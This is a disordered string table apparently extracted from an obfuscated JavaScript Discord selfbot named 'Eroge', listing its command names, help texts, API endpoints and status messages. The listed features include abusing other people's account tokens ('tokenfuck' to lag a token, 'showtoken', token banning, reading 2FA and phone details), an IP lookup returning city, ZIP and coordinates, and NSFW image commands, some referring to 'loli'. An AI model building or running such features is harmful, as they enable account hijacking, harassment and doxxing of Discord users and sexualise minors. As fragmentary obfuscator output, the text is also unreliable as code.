"```Poids:```", "startTyping", " MB", "hboobs", "***Random Neko***", "hentai", "Cool ce serveur", "***Change your hypersquad***", "ownership", "Sorry you don't have the permission for ban a member.", "city", "https://discord.com/api/", " *** give a punch to *** ", "channel", "***Send a ascii art of a bongocat.***", "feetGif", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Random Bio has been started do ", "file", "http://i.some-random-api.ml/pokemon/", "fact + TEXT ```***", "40%", "**🔞 Hthigh Picture 🔞**", "setlight", "***Change your text to italic.***", "🤖 Node", "hthigh ```***", "***Triggered the user mentioned***", "The token will be banned wait a few seconds... ✅", "holoero", "2WZmKpl", "location", "‎‎‎‎‎‎‎‎‎‎\n                    ░░░░█─────────────█──▀──\n                    ░░░░▓█───────▄▄▀▀█──────\n                    ░░░░▒░█────▄█▒░░▄░█─────\n                    ░░░░░░░▀▄─▄▀▒▀▀▀▄▄▀──DO─\n                    ░░░░░░░░░█▒░░░░▄▀───YOU─\n                    ▒▒▒░░░░▄▀▒░░░░▄▀───LIKE─\n                    ▓▓▓▓▒░█▒░░░░░█▄───WHAT─\n                    █████▀▒░░░░░█░▀▄───YOU──\n                    █████▒▒░░░▒█░░░▀▄─SEE?──\n                    ███▓▓▒▒▒▀▀▀█▄░░░░█──────\n                    ▓██▓▒▒▒▒▒▒▒▒▒█░░░░█─────\n                    ▓▓█▓▒▒▒▒▒▒▓▒▒█░░░░░█────\n                    ░▒▒▀▀▄▄▄▄█▄▄▀░░░░░░░█─\n                    ", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Streaming status added.", "\n> Game Activity: ", "***Fuck the token make it lag (gray screen)***", "Please, enter ID of the user you want to whitelist. ❌", "awooify", "lon:", "https://discordapp.com/api/v6/invites/", " has been banned from the server.", "report ```***", "region", "bongocat ```**", "Auto Bold mode enabled. ✅", "AS:", "‎‎‎‎‎‎‎‎‎‎\n                                  lﾆヽ\n                    　    　 |= | \n                    　    　 |_ |\n                    　　/⌒|~ |⌒i-、\n                    　 /|　|　|　| ｜\n                    　｜(　(　(　(　｜\n                    　｜　　　　　 ｜\n                    　 ＼　　　　　/\n                    　　 ＼　　　 |\n                    ", "2014-2-11", "booruError", "***Search all infos on a pokemon with the pokedex***", "fun", "setThumbnail", "italic + TEXT ```**", "kemonomimi", "Eiffel initially showed little enthusiasm, but he did approve further study, and the two engineers then asked Stephen Sauvestre, the head of company's architectural department, to contribute to the design.", "You need enter a number. ❌", "guildDelete", "Country:", "ascii + TEXT ```**", "***(＾▽＾)***", "The design of the Eiffel Tower is attributed to Maurice Koechlin and Émile Nouguier, two senior engineers working for the Compagnie des Établissements Eiffel. It was envisioned after discussion about a suitable centrepiece for the proposed 1889 Exposition Universelle, a world's fair to celebrate the centennial of the French Revolution.", "cheerio", "table", "** ", "setDescription", "***Get some infos about the token***", "***Random image of Femdom***", "***Change your status to your actualy hours***", "***Use clyde with a custom text***", "diff", "join", "▬🔘▬▬▬▬▬▬▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "8ball + TEXT ```***", "***Send a image with a loli chief***", "8ball", "whentheimpostorissus", "lolice", "65%", "❤️ ", "https://discordapp.com/api/v6/users/@me", "setEndTimestamp", "***Make every text you will send to OwOify.***", "Can't find the member.", "***Change the color of embed (HEX) or RANDOM***", "xujknmp", "https://discord.com/api/webhooks/", "Adblock mode enabled. ✅", "rainbowroles", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > You have leave ", "***Random image of PussyWank***", "stats", "hneko", "You need to be the ownership for give it to someone else. ❌", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Custom Spotify status has been added.", "**🔞 Feet Picture 🔞**", "> ***[Eroge - AdBlock]*** Sorry, but i dont cares about your stupid invite link 🖕", "whentheimpostorissusv2 ```**", "org", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Mee6 Rank has been started. do ", "▬▬▬▬▬▬▬▬🔘▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "jpeg", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Custom status streaming has been added.", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Random Nickname has been stopped.", "**🔞 Feet gif Picture 🔞**", "timebio stop for stop it.", "***Pornhub comment with custom text***", "https://i.imgur.com/yos39S9.png", "***Random image of Orgasm***", "***Want to have some sex with the user mentioned***", "lewdavatar ```***", "***╭∩╮（︶︿︶）╭∩╮***", "City:", "***༼ つ ◕_◕ ༽つ***", " 𝙀𝙧𝙤𝙜𝙚 𝙐𝙩𝙞𝙡𝙞𝙩𝙮 ", "json", "https://i.pinimg.com/originals/0e/de/d0/0eded02148d997485272bb52eaf17656.jpg", "HircHg", "9kITYcj", "feelslike", "setdark ```***", "fun ```***", "sadcat", "https://some-random-api.ml/mc?username=", "gender", "\n> Phone: ", "Do you want to reload your discord ?", "***Wasted the user mentioned***", "symbols1 ```**", "Ohh Onii Chan, Under his skirt was a big dick, ready to be sucked.", "desktop", "status5", "symbols10 ```**", "**🔞 Hentai Gif Picture 🔞**", "***Send a ascii art of a satisfied cat.***", "**🔞 Hentai Picture 🔞**", "paizuri", "setAssetsSmallImage", "girlbruh", "hmidriff", "tokenfuck stop for stop it ✅", "kanna ```***", "Organisation:", "***NSFW commands 🔞***", "**🔞 Hboobs Picture 🔞**", " *** slap *** ", "status3", " ** POKEDEX **", "spotify", "```species:```", "You don't have the permission for ban.", "users", "‎‎‎‎‎‎‎‎‎‎\n                        ⠀⠀⠀⠀⠀⠀⣶⣿⣶\n                        ⠀⠀⠀⣤⣤⣤⣿⣿⣿\n                        ⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣶\n                        ⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                        ⠀⠀⣿⣉⣿⣿⣿⣿⣉⠉⣿⣶\n                        ⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿\n                        ⠀⣤⣿⣿⣿⣿⣿⣿⣿⠿⠀⣿⣶\n                        ⣤⣿⠿⣿⣿⣿⣿⣿⠿⠀⠀⣿⣿⣤\n                        ⠉⠉⠀⣿⣿⣿⣿⣿⠀⠀⠒⠛⠿⠿⠿\n                        ⠀⠀⠀⠉⣿⣿⣿⠀⠀⠀⠀⠀⠀⠉\n                        ⠀⠀⠀⣿⣿⣿⣿⣿⣶\n                        ⠀⠀⠀⠀⣿⠉⠿⣿⣿\n                        ⠀⠀⠀⠀⣿⣤⠀⠛⣿⣿\n                        ⠀⠀⠀⠀⣶⣿⠀⠀⠀⣿⣶\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠉\n                        ", "middlefinger", "bonjour à tous !", "yuri ```***", "setUsername", "yaoi", "gay", "***Change your status to purple streaming multi streaming text***", "***Random image of Erotic***", "**🔞 Hass Picture 🔞**", "***Barre your text.***", "symbols8 ```**", "girlsologif ```***", " *** give a hug to *** ", "kiss", "***Send a random meme from r/memes subreddit***", " **", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Status time has been stopped.", "https://i.imgur.com/yasFVqz.jpg", "cat", ".gif", "3_6Xt2k4OieDKimnNYGWUq9vJRo", "http://ip-api.com/json/", "n]ot only the art of the modern engineer, but also the century of Industrand Science in which we are living, and for which the way was prepared by the great scientific movement of the eighteenth century and by the Revolution of 1789, to which this monument will be built as an expression of France's gratitude.", "message", "▬▬▬▬▬▬▬🔘▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "Sorry, you need enter a message. ❌", "***Get all info about a MC user with his username***", "autoyellow ```**", "a loop is already running", "displayAvatarURL", "keta", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Random Bio has been stopped.", "***Send a invisble message to clear the channel***", "gradient-string", "login", "**🔞 Holo erotic Picture 🔞**", "link", "***Random image of Holo Erotic***", "**🔞 Blow Job Picture 🔞**", "true", "Auto Spoiler mode enabled. ✅", "「𝙈𝙚𝙣𝙪 𝙈𝙤𝙙」", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > A loop is already running..", "**🔞 Neko Picture 🔞**", "***Blurpify a members with his avatar***", "pat", "middlefinger ```**", "abc", "***Make a survey about something you want, lets everyone choose***", "degreetype", "***Random 4K image***", "jpeg + URL ```***", "```Type:```", "blowjob ```***", "ZIP:", "lolice + URL ```***", " 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", "girlsurprised", "***Edit every message to a info.***", "hass ```***", "***Transform your text to red.***", "hentaigif ```***", "streaming", "bot", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Please, enter a new color.", "***(ಠ_ಠ)***", "futanari", "long", " <<」**", "sadcat ```***", "The Eiffel Tower (/ˈaɪfəl/ EYE-fəl; French: tour Eiffel [tuʁ‿ɛfɛl] (About this soundlisten)) is a wrought-iron lattice tower on the Champ de Mars in Paris, France. It is named after the engineer Gustave Eiffel, whose company designed and built the tower.", "stats ```***", "hkitsune", "approved", " 👋", "spotify:ab67616d000048514583f97464d6d2fbf1db5752", "Auto Small mode enabled. ✅", "https://some-random-api.ml/canvas/gay?avatar=", " smug 😏", "It was the first structure in the world to surpass both the 200 meter and 300 meter mark in height. Due to the addition of a broadcasting aerial at the top of the tower in 1957, it is now taller than the Chrysler Building by 5.2 metres (17 ft). Excluding transmitters, the Eiffel Tower is the second tallest free-standing structure in France after the Millau Viaduct.", "encode", "‎‎‎‎‎‎‎‎‎‎\n                    ‎‎‎‎‎‎‎‎‎‎⡏⠉⠉⠉⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠉⠉⠉⠹\n                    ⡇⢸⣿⡟⠛⢿⣷⠀⢸⣿⡟⠛⢿⣷⡄⢸⣿⡇⠀⢸⣿⡇⢸⣿⡇⠀⢸⣿⡇⠀\n                    ⡇⢸⣿⣧⣤⣾⠿⠀⢸⣿⣇⣀⣸⡿⠃⢸⣿⡇⠀⢸⣿⡇⢸⣿⣇⣀⣸⣿⡇⠀\n                    ⡇⢸⣿⡏⠉⢹⣿⡆⢸⣿⡟⠛⢻⣷⡄⢸⣿⡇⠀⢸⣿⡇⢸⣿⡏⠉⢹⣿⡇⠀\n                    ⡇⢸⣿⣧⣤⣼⡿⠃⢸⣿⡇⠀⢸⣿⡇⠸⣿⣧⣤⣼⡿⠁⢸⣿⡇⠀⢸⣿⡇⠀\n                    ⣇⣀⣀⣀⣀⣀⣀⣄⣀⣀⣀⣀⣀⣀⣀⣠⣀⡈⠉⣁⣀⣄⣀⣀⣀⣠⣀⣀⣀⣰\n                    ⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷\n                    ⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇\n                    ⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽\n                    ⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕\n                    ⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕\n                    ⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕\n                    ⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄\n                    ⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕\n                    ⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿\n                    ⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟\n                    ⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠\n                    ⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙\n                    ⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣\n                    ", "annoying", "public_flags", "```description:```", "dmfriends", "feetgif", "‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                                  ⢀⣀⣀⣴⣆⣠⣤⠀⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣻⣿⣯⣘⠹⣧⣤⡀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⢿⣿⣷⣾⣯⠉⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠜⣿⡍⠀⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠁⠀⠘⣿⣆⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡟⠃⡄⠀⠘⢿⣆⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣁⣋⣈ ⣤⣮⣿⣧⡀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⠛⠛⠛⠛⠻⢿⣿⣷⣤⡀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠈⢻⣿⣿⡄⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⣸⣿⡏⠀⠀⠀⣠⣶⣾⣿⣿⣿⠿⠿⠿⢿⣿⣿⣿⣄⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁⠀⠀⢰⣿⣿⣯⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄⠀\n                    ⠀⠀⣀⣤⣴⣶⣶⣿⡟⠀⠀⠀⢸⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⠀\n                    ⠀⢰⣿⡟⠋⠉⣹⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣷⣦⣤⣤⣤⣶⣶⣶⣶⣿⣿⣿⠀\n                    ⠀⢸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀\n                    ⠀⣸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⡿⠿⠿⠛⢻⣿⡇⠀⠀\n                    ⠀⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⠀⠀\n                    ⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀\n                    ⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀\n                    ⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀\n                    ⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀\n                    ⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶   ⢠⣿⣿⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿⡏  ⠀⢸⣿⡇⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿⠁⠀⠈⠻⣿⣿⣿⣿⡿⠏⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ", "girlsurprised ```**", "XluxwQ", "596934529927741442", '{}.constructor("return this")( )', "settings", "evolutionLine", "▓▓░░░░░░░░ 20%", "****「>> 🩸 IP LOOKUP 🩸 <<」****", "***Change your status to custom streaming***", "***Random of tentacle***", "***Reset your status***", " / ", "Fake typing enabled. ✅", "***Change your status to purple streaming***", "status6", "**🔞 Tits Picture 🔞**", "```      ", "***Make a wink***", "▓▓▓▓▓▓░░░░ 60%", "catch", "Hours : ", "XnyXiA", "return (function() ", "then", "day", "gettimes", "‎‎‎‎‎‎‎‎‎‎\n               ░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄\n            ░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄\n            ░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█\n            ░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░█\n            ░▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░█\n            █▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒█\n            █▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█\n            ░█▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█\n            ░░█░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█\n            ░░░█░░██░░▀█▄▄▄█▄▄█▄████░█\n            ░░░░█░░░▀▀▄░█░░░█░███████░█\n            ░░░░░▀▄░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█\n            ░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░█\n            ░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░█\n            ░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░█\n            ", "Auto Orange Text mode disabled. ❌", "lesbian ```***", "pgif ```***", "\n> 2FA: ", "```Attack:```", "autoyifive", "8ball have say:", "meme ```***", "fish", "***Slap the user mentioned***", "autoorange", "uptime", "duration", "New AFK message has been set to: ", "**Sad Cat**", "> (°□°）>͡", "rdmbio stop for stop it.", "pingzserver", "kiss + MENTION ```***", "***0_o***", "Client", "https://thumbs.gfycat.com/NeatVengefulHapuku-size_restricted.gif", "***Loop and change your bio to the real time every 1 min***", "***Show the real! token of someone :o***", "smug ```***", "Salut", "**!", "***Loading for something special ? :o***", "nekos.life", "Auto Cyan Text mode enabled. ✅", "whowouldwin", "mediastatus  ```***", "😘 ", "「𝙈𝙚𝙣𝙪 𝙎𝙮𝙢𝙗𝙤𝙡𝙨」", "Rainbow Roles has been stopped. ✅", "addField", "cumsluts ```***", "annoying ```***", "animated", "***Loop and change your bio every 1 min***", "exception", ".png?size=1024", "cumsluts", "mee6rank", "arch", "**🔞 Cum arts Picture 🔞**", "Auto Yellow Text mode disabled. ❌", "「𝙈𝙚𝙣𝙪 𝑺𝒕𝒂𝒕𝒖𝒔」", "trace", "blowJob", "**User awooify**", "https://minotar.net/cube/", "***```", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > ", "I dont think", "***Get statistics of Eroge***", "iplookup", "editedmsg", "**🔞 Hanal Picture 🔞**", "observationpoint", " Wink**", "statustime", "Lat :", "▬▬▬▬▬🔘▬▬▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "/channels/", "Adblock mode disabled. ❌", "mentions", "autoowoifytext ```**", "keta ```***", "setAvatar", "70%", "blowjob", "showtoken", "Alert :", "***Captcha***", " Bot detected, the DM has been closed.", "┬──┬ ノ( ゜-゜ノ)", "***Random image of Tits***", "replace", "feet ```***", "You need enter a username. ❌", "locale", "REACTION", "statustime  ```***", "hanal ```***", "**🔞 Yuri Picture 🔞**", "send", "fact", "***Load something funny***", "‎‎‎‎‎‎‎‎‎‎\n                        ⠀⠀⠀⠀⠀⠀⣤⣶⣶\n                        ⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣀⣀\n                        ⠀⠀⠀⠀⠀⣀⣶⣿⣿⣿⣿⣿⣿\n                        ⣤⣶⣀⠿⠶⣿⣿⣿⠿⣿⣿⣿⣿\n                        ⠉⠿⣿⣿⠿⠛⠉⠀⣿⣿⣿⣿⣿\n                        ⠀⠀⠉⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣤⣤\n                        ⠀⠀⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿\n                        ⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿\n                        ⠀⠀⠀⠀⣀⣿⣿⣿⠿⠉⠀⠀⣿⣿⣿⣿\n                        ⠀⠀⠀⠀⣿⣿⠿⠉⠀⠀⠀⠀⠿⣿⣿⠛\n                        ⠀⠀⠀⠀⠛⣿⣿⣀⠀⠀⠀⠀⠀⣿⣿⣀\n                        ⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠿⣿⣿\n                        ⠀⠀⠀⠀⠀⠉⣿⣿⠀⠀⠀⠀⠀⠀⠉⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣀⣿\n                        ⠀⠀⠀⠀⠀⠀⣀⣿⣿\n                        ⠀⠀⠀⠀⠤⣿⠿⠿⠿\n                        ", "Sorry, this command work only in server. ❌", "cursedcat", "phcomment + MENTION + TEXT ```***", "***Kick a member from the server.***", "showtoken + MENTION ```***", "⌚️ Uptime ", "***Send a ascii art of a facepalm image.***", "https://twitch.tv/discord", "error", "body", "```", "**🔞 Trap Picture 🔞**", "symbols11", "kuni ```***", "buffdoge", "***Random image of Hentai Gif***", "setimage + LINK ```***", "***Edit every message to a bold text.***", "Sorry, you need mention someone. ❌", "**🔞 R34 Picture 🔞**", "***Fake the typing notification in a channel or DM***", "autoorange ```**", "reverse", "```Génération:```", "‎‎‎‎‎‎‎‎‎‎\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠉⠉⠛⠻⢿⣿⠿⠛⠋⠁⠈⠙\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠴⣿⠟⠉⠀⠀⠈⡀⠀⠀⠀⠀⠀⠀\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⣾⣿⣿⣿⣿⣿⠿⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠉⢁⠀⠀⠈⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⣀⣿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⠀⠀⠀⢀⣠⣾⣿⠀⠀⠐⢦⡀⠀\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⣠⡾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠟⠛⠋⢷⣄⠀⠀⠹⣦\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠛⠛⠛⠛⠯⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⡀⠘\n                    ⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠉⠑⠢⣀⠈⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣷\n                    ⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⡇⠀⠀⠀⣀⠄⠒⠀⠀⠀⠀⠀⠑⠢⡙⡳⣄⠀⠀⠀⠈⠀⠀⠀⠀⠈⠻⣿\n                    ⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠃⢀⡴⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠱⠈⠳⡄⠀⠀⠀⢂⠀⠀⠀⠀⠘\n                    ⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣾⡀⢐⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣴⡀⠁⠀⠙⢦⠀⠀⠈⣧⡀⠀⠀⠀\n                    ⣿⣿⣿⠃⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠳⡈⡀⠀⠀⠀⠀⠀⢀⣤⣶⣿⡿⠿⠽⠿⠿⣿⣷⣶⣌⡳⡀⠀⢹⣷⡄⠀⠀\n                    ⣿⡟⠁⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠑⢥⠀⠀⡾⠋⣰⡿⡟⠊⠀⠚⣿⣿⣿⣶⣄⠀⠉⢹⠀⢳⠀⢸⣿⣿⡄⠀\n                    ⣿⠇⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠈⠀⠈⠀⠰⢻⠋⠀⣀⣀⣠⣿⣿⣿⣿⣿⣇⠀⠈⠀⠀⢃⢘⡏⢿⣿⡄\n                    ⡿⠀⠀⠀⠀⠀⠀⣿⠈⠣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢃⠀⠀⠀⠀⠀⠀⠋⠀⠀⢿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠘⣼⡇⠈⢿⣿\n                    ⡇⠀⠀⠀⠀⡆⠀⣿⠀⠀⡨⠂⠄⡀⠀⠀⠀⠠⣀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠈⣿\n                    ⡇⠀⠀⠀⠀⠀⠀⢸⠀⣐⠊⠀⠀⠀⢉⠶⠶⢂⠈⠙⠒⠂⠠⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠀⠸\n                    ⠀⣀⠂⢣⡀⠀⠀⠘⣠⠃⠀⠀⠀⠀⣠⣴⣾⠷⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    